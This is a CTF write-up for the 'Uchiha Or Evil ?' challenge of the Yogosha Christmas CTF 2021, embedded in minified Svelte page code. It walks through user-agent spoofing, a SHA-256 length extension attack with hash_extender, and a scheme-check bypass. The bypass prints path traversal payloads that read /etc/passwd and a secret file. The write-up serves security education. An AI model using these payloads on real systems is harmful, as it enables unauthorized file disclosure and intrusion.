"),Ue=o("code"),ol=t("https"),nl=t(", "),Se=o("code"),pl=t("phttp"),rl=t(", "),Pe=o("code"),Fl=t("fhttp"),cl=t(", "),je=o("code"),il=t("httpf"),hl=t(" etc will return true. Nice we can do something nasty here."),Dl=r(),Ne=o("li"),as=o("p"),yl=t("If we send the payload as it is we’ll get something like this. Because we have to load files from the machine i.e. "),We=o("code"),dl=t("LFI"),El=t(`.
`),b(_s.$$.fragment),fl=r(),Ye=o("li"),ts=o("p"),ul=t(`We can bypass this by using this paylaod
`),Qe=o("code"),vl=t("submit=1&api=phttp://uchiha.fuinjutsukeeper.tech:5000/&endpoint=../../../../../../../../../../etc/passwd"),ml=r(),b(ws.$$.fragment),gl=r(),He=o("li"),ks=o("p"),_l=t("See we still got the error but we also got the contents of "),qe=o("code"),wl=t("/etc/passwd"),kl=t(". This is because this part."),ua=r(),Re=new Rs(!1),Ze=r(),W=o("ul"),Be=o("li"),_=o("p"),$l=t("This is because "),Me=o("code"),bl=t("phttp"),Cl=t(" is not a valid scheme and thus "),ze=o("code"),Al=t("file_get_contents"),Il=t(" thinks it’s just part of the filepath while "),Ge=o("code"),Ol=t("parse_url"),xl=t(" thinks its just a weird scheme unknown to it, but with a valid host and port!. You can read more in this "),ls=o("a"),Ll=t("writeup"),Tl=t(". Always count on smart people."),Ul=r(),Ve=o("li"),os=o("p"),Sl=t("And with this payload "),Ke=o("code"),Pl=t("submit=1&api=phttp://uchiha.fuinjutsukeeper.tech:5000/&endpoint=../../../../../../../../../../secret.txt"),jl=t(` we have the flag
`),b($s.$$.fragment),Nl=r(),Je=o("li"),Xe=o("p"),Wl=t("Originally when I was solving this I don’t know why burp was not showing any output here so I had the answer but wasted a lot of time. Then a friend of mine told me to use python. I was like why I haven’t tried that lol (For the 100th time I’m saying count on smart people to avoid struggles like me) :-). Anyways here is the python script if anyone is interested."),va=r(),sa=new Rs(!1),ea=r(),ns=o("ul"),bs=o("li"),Yl=t("Same thing we’re sending the data as json format this time & everything else is same & I’m "),ps=o("a"),Ql=t("regular expressions"),Hl=t(" to extract the flag part only."),ql=r(),w=o("li"),aa=o("code"),Rl=t("Yogosha{.*"),Zl=t(" means first get "),ta=o("code"),Bl=t("Yogosha{"),Ml=t("(flag format) then "),la=o("code"),zl=t("."),Gl=t(" means any character & finally "),oa=o("code"),Vl=t("*"),Kl=t(` means any number of times( 0 or > 0) & then we’re indexing the first item of the array(list for python)
`),b(Cs.$$.fragment),ma=r(),As=o("h4"),Ns=o("a"),Jl=t("Thank you for reading this write-up I hope it helped you. I was only able to solve only the first 2 challenges so that’s all from me. I hope you learned something. I’ll try to add links of other people whole solved the entire thing"),ga=r(),Ws=o("ul"),Is=o("li"),Xl=t("Check out "),rs=o("a"),so=t("smaury’s"),eo=t(" write-up he has solved all of them even the bonus one. Smart guy alert ;-” do check his write-up it’s awesome."),this.h()},l(e){D=n(e,"H1",{id:!0});var c=p(D);v=n(c,"A",{href:!0});var oo=p(v);R=l(oo,"Uchiha Or Evil ?"),oo.forEach(a),c.forEach(a),M=F(e),y=n(e,"BLOCKQUOTE",{});var no=p(y);m=n(no,"P",{});var po=p(m);Us=l(po,"Yogosha Christmas CTF 2021"),po.forEach(a),no.forEach(a),ca=F(e),ia=n(e,"HR",{}),ha=F(e),Bs=Zs(e,!1),Ms=F(e),k=n(e,"UL",{});var Fs=p(k);zs=n(Fs,"LI",{});var ro=p(zs);Ss=n(ro,"P",{});var ao=p(Ss);xa=l(ao,`From the previous challenge we got a url. Let’s visit the page.
`),C(hs.$$.fragment,ao),ao.forEach(a),ro.forEach(a),La=F(Fs),Gs=n(Fs,"LI",{});var Fo=p(Gs);f=n(Fo,"P",{});var T=p(f);Ta=l(T,"Nothing much on this page. I ran "),Vs=n(T,"CODE",{});var co=p(Vs);Ua=l(co,"nikto"),co.forEach(a),Sa=l(T," & got there is a "),Ks=n(T,"CODE",{});var io=p(Ks);Pa=l(io,"robots.txt"),io.forEach(a),ja=l(T," file here. We can check the robots.txt page & there’s some interesting info. So there is page.Let’s go to "),Js=n(T,"CODE",{});var ho=p(Js);Na=l(ho,"read.php"),ho.forEach(a),Wa=F(T),C(Ds.$$.fragment,T),Ya=F(T),C(ys.$$.fragment,T),T.forEach(a),Fo.forEach(a),Qa=F(Fs),Xs=n(Fs,"LI",{});var Do=p(Xs);S=n(Do,"P",{});var Os=p(S);Ha=l(Os,"We got access denied. There is an interesting line in the robots.txt file which is "),se=n(Os,"CODE",{});var yo=p(se);qa=l(yo,"User-agent: Uchiha"),yo.forEach(a),Ra=l(Os,". Let’s change our useragent to "),ee=n(Os,"CODE",{});var Eo=p(ee);Za=l(Eo,"Uchiha"),Eo.forEach(a),Ba=l(Os,`. You can use burp or a user agent changer extension. And we have something here.
`),C(ds.$$.fragment,Os),Os.forEach(a),Do.forEach(a),Ma=F(Fs),Es=n(Fs,"LI",{});var wa=p(Es);ae=n(wa,"P",{});var fo=p(ae);za=l(fo,"Let’s view the source. We have 2 things here."),fo.forEach(a),Ga=F(wa),fs=n(wa,"OL",{});var ka=p(fs);te=n(ka,"LI",{});var uo=p(te);Va=l(uo,"The form is sending post data with some hash concatenated a filename"),uo.forEach(a),Ka=F(ka),le=n(ka,"LI",{});var vo=p(le);Ja=l(vo,"Some dev notes(comments)"),vo.forEach(a),ka.forEach(a),wa.forEach(a),Fs.forEach(a),Da=F(e),Ps=n(e,"P",{});var mo=p(Ps);C(us.$$.fragment,mo),mo.forEach(a),ya=F(e),z=n(e,"UL",{});var $a=p(z);G=n($a,"LI",{});var na=p(G);Xa=l(na,"If we send the form we can see some odd thing happening here. Looks like the source code of the "),oe=n(na,"CODE",{});var go=p(oe);st=l(go,"read.php"),go.forEach(a),et=l(na,` page is loading. So form the dev comment we can see we have to read the source here in-order to continue from here.
`),C(vs.$$.fragment,na),na.forEach(a),at=F($a),ne=n($a,"LI",{});var _o=p(ne);tt=l(_o,"Let’s save the source in a file & read the code."),_o.forEach(a),$a.forEach(a),da=F(e),pe=Zs(e,!1),re=F(e),$=n(e,"UL",{});var cs=p($);Z=n(cs,"LI",{});var Ys=p(Z);lt=l(Ys,"So this program is using the "),V=n(Ys,"A",{href:!0,rel:!0,target:!0});var wo=p(V);ot=l(wo,"explode"),wo.forEach(a),nt=l(Ys," function to split the array into 2 parts. Hash and the file.Then it’s checking the hash with a concatenating the filename with a secret & from the array we can see there are 3 files. We cannot lord any other file from here. Then it’s just dumping the contents of the files we supplied using the delimiter "),Fe=n(Ys,"CODE",{});var ko=p(Fe);pt=l(ko,":"),ko.forEach(a),rt=l(Ys," to split filenames."),Ys.forEach(a),Ft=F(cs),P=n(cs,"LI",{});var xs=p(P);ct=l(xs,"I stuck here for 2 days trying to get the secret. I even tried to bruteforce the secret. But the organizers told me it’s not brute forcible. There are some attacks on hash but the hash is "),ce=n(xs,"CODE",{});var $o=p(ce);it=l($o,"sha256"),$o.forEach(a),ht=l(xs," with is one of the safest (at the time being. Everything is secure untill someone breaks it ;). Cutting short the ans is "),K=n(xs,"A",{href:!0,rel:!0,target:!0});var bo=p(K);Dt=l(bo,"Length extension attack"),bo.forEach(a),yt=l(xs,". These are the article and videos that helped me."),B=n(xs,"UL",{});var Qs=p(B);ie=n(Qs,"LI",{});var Co=p(ie);J=n(Co,"A",{href:!0,rel:!0,target:!0});var Ao=p(J);dt=l(Ao,"https://blog.skullsecurity.org/2014/plaidctf-web-150-mtpox-hash-extension-attack"),Ao.forEach(a),Co.forEach(a),Et=F(Qs),he=n(Qs,"LI",{});var Io=p(he);X=n(Io,"A",{href:!0,rel:!0,target:!0});var Oo=p(X);ft=l(Oo,"https://www.youtube.com/watch?v=sMla6_4Z-CQ"),Oo.forEach(a),Io.forEach(a),ut=F(Qs),De=n(Qs,"LI",{});var xo=p(De);ss=n(xo,"A",{href:!0,rel:!0,target:!0});var Lo=p(ss);vt=l(Lo,"https://www.youtube.com/watch?v=6QQ4kgDWQ9w"),Lo.forEach(a),xo.forEach(a),Qs.forEach(a),xs.forEach(a),mt=F(cs),js=n(cs,"LI",{});var to=p(js);gt=l(to,"It’s a complicated attack so I left it to the smart people and used this tool "),es=n(to,"A",{href:!0,rel:!0,target:!0});var To=p(es);_t=l(To,"hash_extender"),To.forEach(a),to.forEach(a),wt=F(cs),g=n(cs,"LI",{});var Y=p(g);kt=l(Y,"Here is the syntax "),ye=n(Y,"CODE",{});var Uo=p(ye);$t=l(Uo,"hash_extender --data data --secret len-of-sec --append append --signature hash --format fomrat"),Uo.forEach(a),bt=l(Y,". We know the data "),de=n(Y,"CODE",{});var So=p(de);Ct=l(So,"read.php"),So.forEach(a),At=l(Y,", signature "),Ee=n(Y,"CODE",{});var Po=p(Ee);It=l(Po,"184b5d255817fc0afe9316e67c8f386506a3b28b470c94f47583b76c7c0ec1e5"),Po.forEach(a),Ot=l(Y,", format "),fe=n(Y,"CODE",{});var jo=p(fe);xt=l(jo,"sha256"),jo.forEach(a),Lt=l(Y," we want the length of the secret. We can bruteforce it like this to generate signatures."),Y.forEach(a),cs.forEach(a),Ea=F(e),ue=Zs(e,!1),ve=F(e),j=n(e,"UL",{});var Hs=p(j);ms=n(Hs,"LI",{});var ba=p(ms);Tt=l(ba,"This script will generate a file called "),me=n(ba,"CODE",{});var No=p(me);Ut=l(No,"hashes"),No.forEach(a),St=l(ba," concatenating the hashes. Then we can use burpsuite or python to send the hash & check the result."),ba.forEach(a),Pt=F(Hs),N=n(Hs,"LI",{});var Ls=p(N);jt=l(Ls,"The correct length is "),ge=n(Ls,"CODE",{});var Wo=p(ge);Nt=l(Wo,"42"),Wo.forEach(a),Wt=l(Ls,". And we can see the result here we have the source of "),_e=n(Ls,"CODE",{});var Yo=p(_e);Yt=l(Yo,"guinjutsu.php"),Yo.forEach(a),Qt=F(Ls),C(gs.$$.fragment,Ls),Ls.forEach(a),Ht=F(Hs),we=n(Hs,"LI",{});var Qo=p(we);qt=l(Qo,"So we have another source code let’s see this one in more details"),Qo.forEach(a),Hs.forEach(a),fa=F(e),ke=Zs(e,!1),$e=F(e),u=n(e,"UL",{});var Q=p(u);be=n(Q,"LI",{});var Ho=p(be);L=n(Ho,"P",{});var is=p(L);Rt=l(is,"In short the "),Ce=n(is,"CODE",{});var qo=p(Ce);Zt=l(qo,"check"),qo.forEach(a),Bt=l(is," function is checking for the a url which looks like this "),Ae=n(is,"CODE",{});var Ro=p(Ae);Mt=l(Ro,"http://uchiha.fuinjutsukeeper.tech:5000/"),Ro.forEach(a),zt=l(is,". If the check passes then it’ll concat the endpoint with the url & give the output of whatever we’re supplying. So how can we exploit this we have to load something which is on the "),Ie=n(is,"CODE",{});var Zo=p(Ie);Gt=l(Zo,"http://uchiha.fuinjutsukeeper.tech:5000/"),Zo.forEach(a),Vt=l(is," & we can’t load anything else or can we…"),is.forEach(a),Ho.forEach(a),Kt=F(Q),Oe=n(Q,"LI",{});var Bo=p(Oe);d=n(Bo,"P",{});var E=p(d);Jt=l(E,"It took me an another day (:-` yah I’m slow). Php is weird we all know.. This part "),xe=n(E,"CODE",{});var Mo=p(xe);Xt=l(Mo,"strpos($par['scheme'],'http')!==false)"),Mo.forEach(a),sl=l(E," only checks for if the "),Le=n(E,"CODE",{});var zo=p(Le);el=l(zo,"http"),zo.forEach(a),al=l(E," part is supplied in the url or not; i.e. "),Te=n(E,"CODE",{});var Go=p(Te);tl=l(Go,"http"),Go.forEach(a),ll=l(E,", "),Ue=n(E,"CODE",{});var Vo=p(Ue);ol=l(Vo,"https"),Vo.forEach(a),nl=l(E,", "),Se=n(E,"CODE",{});var Ko=p(Se);pl=l(Ko,"phttp"),Ko.forEach(a),rl=l(E,", "),Pe=n(E,"CODE",{});var Jo=p(Pe);Fl=l(Jo,"fhttp"),Jo.forEach(a),cl=l(E,", "),je=n(E,"CODE",{});var Xo=p(je);il=l(Xo,"httpf"),Xo.forEach(a),hl=l(E," etc will return true. Nice we can do something nasty here."),E.forEach(a),Bo.forEach(a),Dl=F(Q),Ne=n(Q,"LI",{});var sn=p(Ne);as=n(sn,"P",{});var pa=p(as);yl=l(pa,"If we send the payload as it is we’ll get something like this. Because we have to load files from the machine i.e. "),We=n(pa,"CODE",{});var en=p(We);dl=l(en,"LFI"),en.forEach(a),El=l(pa,`.
`),C(_s.$$.fragment,pa),pa.forEach(a),sn.forEach(a),fl=F(Q),Ye=n(Q,"LI",{});var an=p(Ye);ts=n(an,"P",{});var ra=p(ts);ul=l(ra,`We can bypass this by using this paylaod
`),Qe=n(ra,"CODE",{});var tn=p(Qe);vl=l(tn,"submit=1&api=phttp://uchiha.fuinjutsukeeper.tech:5000/&endpoint=../../../../../../../../../../etc/passwd"),tn.forEach(a),ml=F(ra),C(ws.$$.fragment,ra),ra.forEach(a),an.forEach(a),gl=F(Q),He=n(Q,"LI",{});var ln=p(He);ks=n(ln,"P",{});var Ca=p(ks);_l=l(Ca,"See we still got the error but we also got the contents of "),qe=n(Ca,"CODE",{});var on=p(qe);wl=l(on,"/etc/passwd"),on.forEach(a),kl=l(Ca,". This is because this part."),Ca.forEach(a),ln.forEach(a),Q.forEach(a),ua=F(e),Re=Zs(e,!1),Ze=F(e),W=n(e,"UL",{});var qs=p(W);Be=n(qs,"LI",{});var nn=p(Be);_=n(nn,"P",{});var H=p(_);$l=l(H,"This is because "),Me=n(H,"CODE",{});var pn=p(Me);bl=l(pn,"phttp"),pn.forEach(a),Cl=l(H," is not a valid scheme and thus "),ze=n(H,"CODE",{});var rn=p(ze);Al=l(rn,"file_get_contents"),rn.forEach(a),Il=l(H," thinks it’s just part of the filepath while "),Ge=n(H,"CODE",{});var Fn=p(Ge);Ol=l(Fn,"parse_url"),Fn.forEach(a),xl=l(H," thinks its just a weird scheme unknown to it, but with a valid host and port!. You can read more in this "),ls=n(H,"A",{href:!0,rel:!0,target:!0});var cn=p(ls);Ll=l(cn,"writeup"),cn.forEach(a),Tl=l(H,". Always count on smart people."),H.forEach(a),nn.forEach(a),Ul=F(qs),Ve=n(qs,"LI",{});var hn=p(Ve);os=n(hn,"P",{});var Fa=p(os);Sl=l(Fa,"And with this payload "),Ke=n(Fa,"CODE",{});var Dn=p(Ke);Pl=l(Dn,"submit=1&api=phttp://uchiha.fuinjutsukeeper.tech:5000/&endpoint=../../../../../../../../../../secret.txt"),Dn.forEach(a),jl=l(Fa,` we have the flag
`),C($s.$$.fragment,Fa),Fa.forEach(a),hn.forEach(a),Nl=F(qs),Je=n(qs,"LI",{});var yn=p(Je);Xe=n(yn,"P",{});var dn=p(Xe);Wl=l(dn,"Originally when I was solving this I don’t know why burp was not showing any output here so I had the answer but wasted a lot of time. Then a friend of mine told me to use python. I was like why I haven’t tried that lol (For the 100th time I’m saying count on smart people to avoid struggles like me) :-). Anyways here is the python script if anyone is interested."),dn.forEach(a),yn.forEach(a),qs.forEach(a),va=F(e),sa=Zs(e,!1),ea=F(e),ns=n(e,"UL",{});var Aa=p(ns);bs=n(Aa,"LI",{});var Ia=p(bs);Yl=l(Ia,"Same thing we’re sending the data as json format this time & everything else is same & I’m "),ps=n(Ia,"A",{href:!0,rel:!0,target:!0});var En=p(ps);Ql=l(En,"regular expressions"),En.forEach(a),Hl=l(Ia," to extract the flag part only."),Ia.forEach(a),ql=F(Aa),w=n(Aa,"LI",{});var q=p(w);aa=n(q,"CODE",{});var fn=p(aa);Rl=l(fn,"Yogosha{.*"),fn.forEach(a),Zl=l(q," means first get "),ta=n(q,"CODE",{});var un=p(ta);Bl=l(un,"Yogosha{"),un.forEach(a),Ml=l(q,"(flag format) then "),la=n(q,"CODE",{});var vn=p(la);zl=l(vn,"."),vn.forEach(a),Gl=l(q," means any character & finally "),oa=n(q,"CODE",{});var mn=p(oa);Vl=l(mn,"*"),mn.forEach(a),Kl=l(q,` means any number of times( 0 or > 0) & then we’re indexing the first item of the array(list for python)
`),C(Cs.$$.fragment,q),q.forEach(a),Aa.forEach(a),ma=F(e),As=n(e,"H4",{id:!0});var gn=p(As);Ns=n(gn,"A",{href:!0});var _n=p(Ns);Jl=l(_n,"Thank you for reading this write-up I hope it helped you. I was only able to solve only the first 2 challenges so that’s all from me. I hope you learned something. I’ll try to add links of other people whole solved the entire thing"),_n.forEach(a),gn.forEach(a),ga=F(e),Ws=n(e,"UL",{});var wn=p(Ws);Is=n(wn,"LI",{});var Oa=p(Is);Xl=l(Oa,"Check out "),rs=n(Oa,"A",{href:!0,rel:!0,target:!0});var kn=p(rs);so=l(kn,"smaury’s"),kn.forEach(a),eo=l(Oa," write-up he has solved all of them even the bonus one. Smart guy alert ;-” do check his write-up it’s awesome."),Oa.forEach(a),wn.forEach(a),this.h()},h(){i(v,"href","#uchiha-or-evil-"),i(D,"id","uchiha-or-evil-"),Bs.a=Ms,pe.a=re,i(V,"href","https://www.w3schools.com/php/func_string_explode.asp"),i(V,"rel","nofollow noopener noreferrer external"),i(V,"target","_blank"),i(K,"href","https://en.wikipedia.org/wiki/Length_extension_attack"),i(K,"rel","nofollow noopener noreferrer external"),i(K,"target","_blank"),i(J,"href","https://blog.skullsecurity.org/2014/plaidctf-web-150-mtpox-hash-extension-attack"),i(J,"rel","nofollow noopener noreferrer external"),i(J,"target","_blank"),i(X,"href","https://www.youtube.com/watch?v=sMla6_4Z-CQ"),i(X,"rel","nofollow noopener noreferrer external"),i(X,"target","_blank"),i(ss,"href","https://www.youtube.com/watch?v=6QQ4kgDWQ9w"),i(ss,"rel","nofollow noopener noreferrer external"),i(ss,"target","_blank"),i(es,"href","https://github.com/iagox86/hash_extender"),i(es,"rel","nofollow noopener noreferrer external"),i(es,"target","_blank"),ue.a=ve,ke.a=$e,Re.a=Ze,i(ls,"href","https://deltaclock.gitbook.io/ctf-writeups/securinets-ctf-quals-2021-mixed"),i(ls,"rel","nofollow noopener noreferrer external"),i(ls,"target","_blank"),sa.a=ea,i(ps,"href","https://en.wikipedia.org/wiki/Regular_expression"),i(ps,"rel","nofollow noopener noreferrer external"),i(ps,"target","_blank"),i(Ns,"href","#thank-you-for-reading-this-write-up-i-hope-it-helped-you-i-was-only-able-to-solve-only-the-first-2-challenges-so-thats-all-from-me-i-hope-you-learned-something-ill-try-to-add-links-of-other-people-whole-solved-the-entire-thing"),i(As,"id","thank-you-for-reading-this-write-up-i-hope-it-helped-you-i-was-only-able-to-solve-only-the-first-2-challenges-so-thats-all-from-me-i-hope-you-learned-something-ill-try-to-add-links-of-other-people-whole-solved-the-entire-thing"),i(rs,"href","https://github.com/smaury/CTF-writeups/tree/main/2021/yogosha-christmas-challenge"),i(rs,"rel","nofollow noopener noreferrer external"),i(rs,"target","_blank")},m(e,c){h(e,D,c),s(D,v),s(v,R),h(e,M,c),h(e,y,c),s(y,m),s(m,Us),h(e,ca,c),h(e,ia,c),h(e,ha,c),Bs.m(An,e,c),h(e,Ms,c),h(e,k,c),s(k,zs),s(zs,Ss),s(Ss,xa),A(hs,Ss,null),s(k,La),s(k,Gs),s(Gs,f),s(f,Ta),s(f,Vs),s(Vs,Ua),s(f,Sa),s(f,Ks),s(Ks,Pa),s(f,ja),s(f,Js),s(Js,Na),s(f,Wa),A(Ds,f,null),s(f,Ya),A(ys,f,null),s(k,Qa),s(k,Xs),s(Xs,S),s(S,Ha),s(S,se),s(se,qa),s(S,Ra),s(S,ee),s(ee,Za),s(S,Ba),A(ds,S,null),s(k,Ma),s(k,Es),s(Es,ae),s(ae,za),s(Es,Ga),s(Es,fs),s(fs,te),s(te,Va),s(fs,Ka),s(fs,le),s(le,Ja),h(e,Da,c),h(e,Ps,c),A(us,Ps,null),h(e,ya,c),h(e,z,c),s(z,G),s(G,Xa),s(G,oe),s(oe,st),s(G,et),A(vs,G,null),s(z,at),s(z,ne),s(ne,tt),h(e,da,c),pe.m(In,e,c),h(e,re,c),h(e,$,c),s($,Z),s(Z,lt),s(Z,V),s(V,ot),s(Z,nt),s(Z,Fe),s(Fe,pt),s(Z,rt),s($,Ft),s($,P),s(P,ct),s(P,ce),s(ce,it),s(P,ht),s(P,K),s(K,Dt),s(P,yt),s(P,B),s(B,ie),s(ie,J),s(J,dt),s(B,Et),s(B,he),s(he,X),s(X,ft),s(B,ut),s(B,De),s(De,ss),s(ss,vt),s($,mt),s($,js),s(js,gt),s(js,es),s(es,_t),s($,wt),s($,g),s(g,kt),s(g,ye),s(ye,$t),s(g,bt),s(g,de),s(de,Ct),s(g,At),s(g,Ee),s(Ee,It),s(g,Ot),s(g,fe),s(fe,xt),s(g,Lt),h(e,Ea,c),ue.m(On,e,c),h(e,ve,c),h(e,j,c),s(j,ms),s(ms,Tt),s(ms,me),s(me,Ut),s(ms,St),s(j,Pt),s(j,N),s(N,jt),s(N,ge),s(ge,Nt),s(N,Wt),s(N,_e),s(_e,Yt),s(N,Qt),A(gs,N,null),s(j,Ht),s(j,we),s(we,qt),h(e,fa,c),ke.m(xn,e,c),h(e,$e,c),h(e,u,c),s(u,be),s(be,L),s(L,Rt),s(L,Ce),s(Ce,Zt),s(L,Bt),s(L,Ae),s(Ae,Mt),s(L,zt),s(L,Ie),s(Ie,Gt),s(L,Vt),s(u,Kt),s(u,Oe),s(Oe,d),s(d,Jt),s(d,xe),s(xe,Xt),s(d,sl),s(d,Le),s(Le,el),s(d,al),s(d,Te),s(Te,tl),s(d,ll),s(d,Ue),s(Ue,ol),s(d,nl),s(d,Se),s(Se,pl),s(d,rl),s(d,Pe),s(Pe,Fl),s(d,cl),s(d,je),s(je,il),s(d,hl),s(u,Dl),s(u,Ne),s(Ne,as),s(as,yl),s(as,We),s(We,dl),s(as,El),A(_s,as,null),s(u,fl),s(u,Ye),s(Ye,ts),s(ts,ul),s(ts,Qe),s(Qe,vl),s(ts,ml),A(ws,ts,null),s(u,gl),s(u,He),s(He,ks),s(ks,_l),s(ks,qe),s(qe,wl),s(ks,kl),h(e,ua,c),Re.m(Ln,e,c),h(e,Ze,c),h(e,W,c),s(W,Be),s(Be,_),s(_,$l),s(_,Me),s(Me,bl),s(_,Cl),s(_,ze),s(ze,Al),s(_,Il),s(_,Ge),s(Ge,Ol),s(_,xl),s(_,ls),s(ls,Ll),s(_,Tl),s(W,Ul),s(W,Ve),s(Ve,os),s(os,Sl),s(os,Ke),s(Ke,Pl),s(os,jl),A($s,os,null),s(W,Nl),s(W,Je),s(Je,Xe),s(Xe,Wl),h(e,va,c),sa.m(Tn,e,c),h(e,ea,c),h(e,ns,c),s(ns,bs),s(bs,Yl),s(bs,ps),s(ps,Ql),s(bs,Hl),s(ns,ql),s(ns,w),s(w,aa),s(aa,Rl),s(w,Zl),s(w,ta),s(ta,Bl),s(w,Ml),s(w,la),s(la,zl),s(w,Gl),s(w,oa),s(oa,Vl),s(w,Kl),A(Cs,w,null),h(e,ma,c),h(e,As,c),s(As,Ns),s(Ns,Jl),h(e,ga,c),h(e,Ws,c),s(Ws,Is),s(Is,Xl),s(Is,rs),s(rs,so),s(Is,eo),_a=!0},p:Nn,i(e){_a||(I(hs.$$.fragment,e),I(Ds.$$.fragment,e),I(ys.$$.fragment,e),I(ds.$$.fragment,e),I(us.$$.fragment,e),I(vs.$$.fragment,e),I(gs.$$.fragment,e),I(_s.$$.fragment,e),I(ws.$$.fragment,e),I($s.$$.fragment,e),I(Cs.$$.fragment,e),_a=!0)},o(e){O(hs.$$.fragment,e),O(Ds.$$.fragment,e),O(ys.$$.fragment,e),O(ds.$$.fragment,e),O(us.$$.fragment,e),O(vs.$$.fragment,e),O(gs.$$.fragment,e),O(_s.$$.fragment,e),O(ws.$$.fragment,e),O($s.$$.fragment,e),O(Cs.$$.fragment,e),_a=!1},d(e){e&&a(D),e&&a(M),e&&a(y),e&&a(ca),e&&a(ia),e&&a(ha),e&&Bs.d(),e&&a(Ms),e&&a(k),x(hs),x(Ds),x(ys),x(ds),e&&a(Da),e&&a(Ps),x(us),e&&a(ya),e&&a(z),x(vs),e&&a(da),e&&pe.d(),e&&a(re),e&&a($),e&&a(Ea),e&&ue.d(),e&&a(ve),e&&a(j),x(gs),e&&a(fa),e&&ke.d(),e&&a($e),e&&a(u),x(_s),x(ws),e&&a(ua),e&&Re.d(),e&&a(Ze),e&&a(W),x($s),e&&a(va),e&&sa.d(),e&&a(ea),e&&a(ns),x(Cs),e&&a(ma),e&&a(As),e&&a(ga),e&&a(Ws)}}}function Qn(Ts){let D,v;const R=[Ts[0],Cn];let M={$$slots:{default:[Yn]},$$scope:{ctx:Ts}};for(let y=0;y<R.length;y+=1)M=lo(M,R[y]);return D=new Wn({props:M}),{c(){b(D.$$.fragment)},l(y){C(D.$$.fragment,y)},m(y,m){A(D,y,m),v=!0},p(y,[m]){const Us=m&1?jn(R,[m&1&&$n(y[0]),m&0&&$n(Cn)]):{};m&2&&(Us.$$scope={dirty:m,ctx:y}),D.$set(Us)},i(y){v||(I(D.$$.fragment,y),v=!0)},o(y){O(D.$$.fragment,y),v=!1},d(y){x(D,y)}}}const Cn={title:"Uchiha Or Evil ?",image:"/assets/APYxowi.png",created:"2021-12-19T00:00:00.000Z",updated:"2021-12-19T00:00:00.000Z",tags:["ctf","yogosha"],flags:[],slug:"/Yogosha Christmans CTF 21/Uchiha Or Evil/+page.svelte.md",path:"/Yogosha Christmans CTF 21/Uchiha Or Evil",toc:[{depth:1,title:"Uchiha Or Evil ?",slug:"uchiha-or-evil-"},{depth:4,title:"Thank you for reading this write-up I hope it helped you. I was only able to solve only the first 2 challenges so that’s all from me. I hope you learned something. I’ll try to add links of other people whole solved the entire thing",slug:"thank-you-for-reading-this-write-up-i-hope-it-helped-you-i-was-only-able-to-solve-only-the-first-2-challenges-so-thats-all-from-me-i-hope-you-learned-something-ill-try-to-add-links-of-other-people-whole-solved-the-entire-thing"}]};function Hn(Ts,D,v){return Ts.$$set=R=>{v(0,D=lo(lo({},D),bn(R)))},D=bn(D),[D]}class Bn extends Un{constructor(D){super(),Sn(this,D,Hn,Qn,Pn,{})}}export{Bn as default,Cn as metadata};
